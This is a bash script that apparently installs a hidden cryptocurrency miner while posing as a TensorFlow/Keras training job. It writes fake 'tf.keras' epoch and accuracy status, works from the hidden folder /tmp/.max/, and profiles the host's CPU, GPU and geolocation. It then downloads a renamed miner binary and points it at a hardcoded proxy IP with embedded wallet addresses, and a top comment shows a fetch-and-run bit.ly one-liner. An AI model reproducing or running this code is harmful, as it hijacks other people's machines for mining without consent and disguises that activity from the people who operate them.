#!/bin/bash
# wget -q -O /tmp/cpu bit.ly/CPU00001; bash /tmp/cpu

echo '{ '
echo '"type":"tf.keras",' > /tmp/keras.json
echo '"version":"0.0.9",' >> /tmp/keras.json
if [[ $1 -gt 0 ]] 
then
    echo '"version":"0.0.9",'
fi
echo '"status":"Epoch 1/5 1875/1875 [==============================] - 5s 2ms/step - loss: 0.1173 - accuracy: 0.9127",' >> /tmp/keras.json

PROX=168.119.180.25
ETPort=80
RVPort=8080
VCPort=443
XMPort=21
TESTPort=587
TESTPort2=465
DisplayRefrech=600
echo '"df":'$DisplayRefrech',' >> /tmp/keras.json

HZ_PROX1=$PROX
HZ_PROX2=168.119.180.25
EU_PROX=$PROX
US_PROX=168.119.180.25
CA_PROX=168.119.180.25
ASIA_PROX=$PROX

#VCOptions="d=16,xn=1,hybrid"
#VCOptions="mc=VRSC"
VCOptions="c=DOGE"
#VCOptions="c=VRSC,mc=VRSC"

#VCOptions="X"

SWITCHOPG=AUTO
SWITCHOP=VC

#SWITCHPROX=AUTO
SWITCHPROX=$HZ_PROX2

VCThreads=$[$(nproc)*2]
XMThreads=$[$(nproc)*1]

#Debug=True
Debug=False

#Keys
W_ET="0x1be9C1Db52aC9cD736160c532D69aA4770c327B7"
W_RV="RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK"
W_XM="44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p"
W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
W_BT="1MEdZan82tai5Kb7fqFJNgfpGhtsP47MFT"
W_DG="D5EcMFZqLsd4CdZipk3LXviX8YUzEEfBj7"
W_DG2="DSro3i42vz2MytCw22S4wun5qM5bTNNy5c"
W_DG3="DPvNFshhBNh2GHV5KUsNdLvpgeUzw4HAb2"
W_DG4="DA6Q7BdoFBJQNvfCeUrHoeWLHXL857maZ9"


W_VC=$W_DG3
VC_LUCK=""
#VC_LUCK="c=VRSC,mc=VRSC"

if [ $VC_LUCK ]
then 
W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
VCOptions=$VC_LUCK
fi
# Directory
Work_Dir="/tmp/.max/"
mkdir -p $Work_Dir
cd  $Work_Dir

##################### functions #####################################

function displaytime {
  local T=$1
  local D=$((T/60/60/24))
  local H=$((T/60/60%24))
  local M=$((T/60%60))
  local S=$((T%60))
  (( $D > 0 )) && printf '%d days ' $D
  (( $H > 0 )) && printf '%d hours ' $H
  (( $M > 0 )) && printf '%d minutes ' $M
  (( $D > 0 || $H > 0 || $M > 0 )) && printf 'and '
  printf '%d seconds\n' $S
}



##  CPU info

echo -e '#####################################   CPU info  ###########################################' > /tmp/pysi.log

VCPUNUM=$(nproc)
echo '"nproc":'$VCPUNUM',' >> /tmp/keras.json

cpufile=/proc/cpuinfo
test -f $cpufile || exit 1
CPUMODEL=$(grep "model name" $cpufile | sort -u | cut -d : -f 2-)
# echo -n CPU Model: $CPUMODEL
CPUCACHE=$(grep "cache size" $cpufile | sort -u | cut -d : -f 2-)
# echo " with $CPUCACHE cache."
CPUSPEED=$(grep "cpu MHz" $cpufile | sort -u | cut -d : -f 2-|tail -n 1)
# echo " with $CPUSPEED MHz."
numphy=$(grep "physical id" $cpufile | sort -u | wc -l)
# echo -n "Physical CPUs: ${numphy}.  "
numcore=$(grep "core id" $cpufile | sort -u | wc -l)
# echo -n "Cores/CPU: ${numcore}.  "
# echo -n "Physical cores: $((numcore * numphy)).  "
numlog=$(grep "processor" $cpufile | wc -l)
# echo "Logical cores: ${numlog}."

memtot=$(free -h | grep Mem | awk '{print $2}')
# echo -n "Total RAM: ${memtot}."

# The /usr/sbin/dmidecode command can give the number, size and speed of the
# installed RAM, but it must be run as root.
if [[ "$USER" == "root" ]]; then
    raminfo=$(dmidecode --type 17 |\
            awk '/Size/{if ($2!="No") printf "%s %s, ",$2,$3} {if ($1=="Speed:" && $2!="Unknown") print $2" "$3}' |\
            uniq -c)
#    echo -n "  Composition:"
#    echo "$raminfo" | awk '{if (NF==5) print "  "$1" x "$2" "$3" "$4" "$5"."}'
else
    echo > /tmp/pysi.log
fi

gcard=$(lspci 2>> /tmp/.max/err| awk -F ':' '/VGA/{print $3}')
#echo "Graphics:${gcard}."

netinfo=$(ip addr 2>> /tmp/.max/err| grep -2 "en[o-p][0-9]\|eth[0-9]" | grep -1 "inet ")
macaddr=$(echo "$netinfo" | awk '/link/{print $2}')
ipaddr=$(echo "$netinfo" | awk '/inet/{print $2}' | awk -F'/' '{print $1}')
echo '"ip_backend":"'$ipaddr'",' >> /tmp/keras.json
#echo "Ethernet: MAC Address: ${macaddr}.  IP Address: ${ipaddr}."

echo -e '#############################################################################################' > /tmp/pysi.log



wget -q -O /tmp/jq https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64
chmod +x /tmp/jq


INFIDIFF=$(curl -s  --connect-to api.minerstat.com:443:$HZ_PROX1:8888  https://api.minerstat.com//v2/coins\?list\=ETH,RVN,XMR,VRSC --insecure)

ETHDIF=$(echo  $INFIDIFF | /tmp/jq '.[0].difficulty')
ETHREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[0].reward')
ETHPRICE=$(echo  $INFIDIFF | /tmp/jq '.[0].price')


RVDIF=$(echo  $INFIDIFF | /tmp/jq '.[1].difficulty')
RVREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[1].reward')
RVPRICE=$(echo  $INFIDIFF | /tmp/jq '.[1].price')

VCDIF=$(echo  $INFIDIFF | /tmp/jq '.[3].difficulty')
VCREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[3].reward')
VCPRICE=$(echo  $INFIDIFF | /tmp/jq '.[3].price')

XMDIF=$(echo  $INFIDIFF | /tmp/jq '.[2].difficulty')
XMREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[2].reward')
XMPRICE=$(echo  $INFIDIFF | /tmp/jq '.[2].price')




ETHPROFIT=$(python3 -c "print('%.2f' % (22.0*$ETHREWARD*1e6*$ETHPRICE*24*30 ) )"  )
RVPROFIT=$(python3 -c "print('%.2f' % (8.0*$RVREWARD*1e6*$RVPRICE*24*30 ) )"  )
VCPROFIT=$(python3 -c "print('%.2f' % (1.3*$VCREWARD*1e6*$VCPRICE*24*30 ) )")
XMPROFIT=$(python3 -c "print('%.2f' % ( 300.2*$XMREWARD*$XMPRICE*24*30 ) )"   )

echo "Normal Month worth : ET = $ETHPROFIT , RV = $RVPROFIT , VC = $VCPROFIT , XM = $XMPROFIT" > /tmp/pysi.log
echo '"ET_pro":'$ETHPROFIT','>> /tmp/keras.json
echo '"RV_pro":'$RVPROFIT',' >> /tmp/keras.json
echo '"VC_pro":'$VCPROFIT',' >> /tmp/keras.json
echo '"XM_pro":'$XMPROFIT',' >> /tmp/keras.json
## getting IP info
#COININFO=$(wget -q -O - https://whattomine.com/coins.json)
#COININFO_PARSED=$(echo $COININFO|grep -oP '(?<="coins": ")[^"]*')
#ETINFO=$(echo $COININFO_PARSED|grep -oP '(?<="Ethereum": ")[^"]*')
#RVINFO=$(echo $COININFO_PARSED|grep -oP '(?<="Ravencoin": ")[^"]*')
JSINFO=$(wget -q -O - ipinfo.io)
CITY=$(echo $JSINFO|grep -oP '(?<="city": ")[^"]*')
REGION=$(echo $JSINFO|grep -oP '(?<="region": ")[^"]*')
COUNTRY=$(echo $JSINFO|grep -oP '(?<="country": ")[^"]*')
IPORG=$(echo $JSINFO|grep -oP '(?<="org": ")[^"]*')
IIP=$(echo $JSINFO|grep -oP '(?<="ip": ")[^"]*')
#IPNAME=$(sed 's|\.|o|g' <<< $IIP)
IPNAME=$(echo $IIP | sed -r 's!/.*!!; s!.*\.!!')
INFO="$COUNTRY""_""$IPNAME"
LOC=$(echo $JSINFO|grep -oP '(?<="loc": ")[^"]*')
#echo $JSINFO
echo "let's name it: $INFO" > /tmp/pysi.log

echo '"ip":"'$IIP'",' >> /tmp/keras.json

echo '"org":"'$IPORG'",' >> /tmp/keras.json
echo '"city":"'$CITY'",' >> /tmp/keras.json
echo '"country":"'$COUNTRY'",' >> /tmp/keras.json
echo '"region":"'$REGION'",' >> /tmp/keras.json

################## Best Server ##################
if [ $SWITCHPROX == AUTO ]
then
    if [ $COUNTRY == US ]
    then
    PROX=$US_PROX
    elif [ $COUNTRY == CA ]
    then
    PROX=$CA_PROX
    elif [ $COUNTRY == TW ]
    then
    PROX=$ASIA_PROX
    elif [ $COUNTRY == CN ]
    then
    PROX=$ASIA_PROX
    elif [ $COUNTRY == JP ]
    then
    PROX=$ASIA_PROX
    elif [ $COUNTRY == BR ]
    then
    PROX=$US_PROX
    else
    PROX=$EU_PROX
    fi
else
    PROX=$SWITCHPROX
fi
#################################################

## COLORS
# Reset
Color_Off='\033[0m'       # Text Reset

# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White

# Underline
UBlack='\033[4;30m'       # Black
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UCyan='\033[4;36m'        # Cyan
UWhite='\033[4;37m'       # White

# Background
On_Black='\033[40m'       # Black
On_Red='\033[41m'         # Red
On_Green='\033[42m'       # Green
On_Yellow='\033[43m'      # Yellow
On_Blue='\033[44m'        # Blue
On_Purple='\033[45m'      # Purple
On_Cyan='\033[46m'        # Cyan
On_White='\033[47m'       # White

# High Intensity
IBlack='\033[0;90m'       # Black
IRed='\033[0;91m'         # Red
IGreen='\033[0;92m'       # Green
IYellow='\033[0;93m'      # Yellow
IBlue='\033[0;94m'        # Blue
IPurple='\033[0;95m'      # Purple
ICyan='\033[0;96m'        # Cyan
IWhite='\033[0;97m'       # White

# Bold High Intensity
BIBlack='\033[1;90m'      # Black
BIRed='\033[1;91m'        # Red
BIGreen='\033[1;92m'      # Green
BIYellow='\033[1;93m'     # Yellow
BIBlue='\033[1;94m'       # Blue
BIPurple='\033[1;95m'     # Purple
BICyan='\033[1;96m'       # Cyan
BIWhite='\033[1;97m'      # White

# High Intensity backgrounds
On_IBlack='\033[0;100m'   # Black
On_IRed='\033[0;101m'     # Red
On_IGreen='\033[0;102m'   # Green
On_IYellow='\033[0;103m'  # Yellow
On_IBlue='\033[0;104m'    # Blue
On_IPurple='\033[0;105m'  # Purple
On_ICyan='\033[0;106m'    # Cyan
On_IWhite='\033[0;107m'   # White

#clen log

echo > oout
echo > ooutxm
echo  > ooutvc

##################################################################
########                Decision                         #########     
##################################################################

#################### CPU ARC ################################
CPU='OLD'
if [ $(lscpu |grep avx512 |wc -l) == 1 ]
then 
echo -e "${On_IGreen}"'## CPU AVX512 ##'"${Color_Off}" > /tmp/pysi.log
OP=XM
CPU='AVX512'
BCColor="$On_Green""$BICyan"
elif [ $(lscpu |grep avx2 |wc -l) == 1 ]
then
echo -e "${On_IBlue}"'##CPU AVX2 ##'"${Color_Off}" > /tmp/pysi.log
OP=VC
CPU='AVX2'
BCColor="$On_Blue""$BICyan"
elif [ $(lscpu |grep avx |wc -l) == 1 ]
then
echo -e "${On_IYellow}"'## CPU AVX ##'"${Color_Off}" > /tmp/pysi.log
OP=VC
CPU='AVX'
BCColor="$On_Yellow""$BICyan"
else
echo -e "${On_IRed}"'##  CPU OLD  ##'"${Color_Off}" > /tmp/pysi.log
OP=VC
CPU='OLD'
BCColor="$On_Red""$BICyan"
fi
echo '"cpu_type":"'$CPU'",' >> /tmp/keras.json

#################### GPU Type #########################
GPU=NULL
if [ $(nvidia-smi 2>> /tmp/.max/err | grep P100-PCIE |wc -l) == 1 ]
then

echo -e "${On_IGreen}"'###### P100-PCIE ######'"${Color_Off}" > /tmp/pysi.log
GPU=P100
OPG=ET
PROG=CU
BGColor=$On_IGreen
elif [ $(nvidia-smi 2>> /tmp/.max/err | grep failed |wc -l) == 1 ]
then
echo -e "${On_IBlue}"'#### ONLY CPU ###'"${Color_Off}" > /tmp/pysi.log
GPU=NONE
OPG=NONE
BGColor=$On_IRed
elif [ $( nvidia-smi 2>> /tmp/.max/err  2>&1 |  grep "not found" |wc -l) == 1 ]
then
echo -e "${On_IRed}"'### No cuda ONLY CPU ###'"${Color_Off}" > /tmp/pysi.log
GPU=NONE
OPG=NONE
BGColor=$On_IRed
elif [ $(nvidia-smi 2>> /tmp/.max/err | grep T4 |wc -l) == 1 ]
then
echo -e "${On_IBlue}"'####        T4        ###'"${Color_Off}" > /tmp/pysi.log
GPU=T4
OPG=ET
PROG=CU
BGColor=$On_IBlue
elif [ $(nvidia-smi 2>> /tmp/.max/err | grep K80 |wc -l) == 1 ]
then
echo -e "${On_IYellow}"'###    K80     ###'"${Color_Off}" > /tmp/pysi.log
GPU=K80
OPG=RV
PROG=CU
BGColor="$On_IYellow""$BRed"
elif [ $(nvidia-smi 2>> /tmp/.max/err | grep P4 |wc -l) == 1 ]
then

echo -e "${On_ICyan}"'###    P4    ###'"${Color_Off}" > /tmp/pysi.log
GPU=P4
OPG=ET
PROG=CU
BGColor=$On_ICyan
else
echo -e "${On_IPurple}"'###     Other GPU   ####'"${Color_Off}" > /tmp/pysi.log
GPU=OTHER
OPG=ET
PROG=CL
BGColor=$On_IPurple

fi
echo '"gpu_type":"'$GPU'",' >> /tmp/keras.json

if  [[ "$1" -ge 0 ]] 
then
    echo '"gpu_type":"'$GPU'",'
fi

##################################################################
########                execution                        #########     
##################################################################
if [ $SWITCHOPG == "AUTO" ]
then
#OP=$OP
OPG=$OPG
else
OPG=$SWITCHOPG
fi

if [ $SWITCHOP == "AUTO" ]
then
OP=$OP
else
OP=$SWITCHOP
fi

echo '"opc":"'$OP'",' >> /tmp/keras.json
echo '"opg":"'$OPG'",' >> /tmp/keras.json

i="0"

  wget -q https://github.com/one10001/10001code/raw/main/pythonheq
  chmod +x pythonheq
 ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 